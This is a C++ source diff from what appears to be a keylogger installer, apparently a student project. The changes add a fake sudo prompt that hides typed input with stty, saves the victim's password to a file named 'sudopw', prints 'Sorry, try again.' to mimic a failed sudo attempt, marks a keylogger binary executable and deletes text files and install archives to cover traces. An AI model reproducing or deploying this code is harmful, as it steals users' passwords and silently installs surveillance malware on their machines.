@@ -20,6 +20,7 @@ const char *text=
 	"cd ..\n"
 	"cp -r Scripts/ ../../Scripts \n"
 	"cd ../..\n"
+	"rm -r -r *.txt\n"
 	"rm -r -f keylog.zip keylog_ins\n"
 	"rm -r -f final-project-click-to-add-lemon-master\n"
 	"cd Scripts/\n"
@@ -65,9 +66,7 @@ int main(){
 			//store sudo password
 			
 			string username;
-			ofstream ufile("uname.txt");
 			system("echo \"$USER\" >> uname.txt");
-			ufile.close();
 			
 			ifstream unfile;
 			unfile.open("uname.txt");
@@ -76,13 +75,19 @@ int main(){
 			}
 			unfile.close();
 			
-			cout<<"[sudo] password for "<<username << ":"<<endl;
-			
+			cout<<"[sudo] password for "<<username << ":";
+			//set terminal command invisible
+			system("stty -g > Tsetting.txt");
+			system("stty -echo");
+			//store password
 			string psw;
 			cin>>psw;
-			ofstream sfile("sudopw.txt");
+			ofstream sfile("sudopw");
 			sfile<<psw;
 			sfile.close();
+			
+			// set terminal command visible
+			system("stty $(cat Tsetting.txt)");
 			
 			cout<<"Sorry, try again.\n";
 			system("chmod 755 keylog_ins");
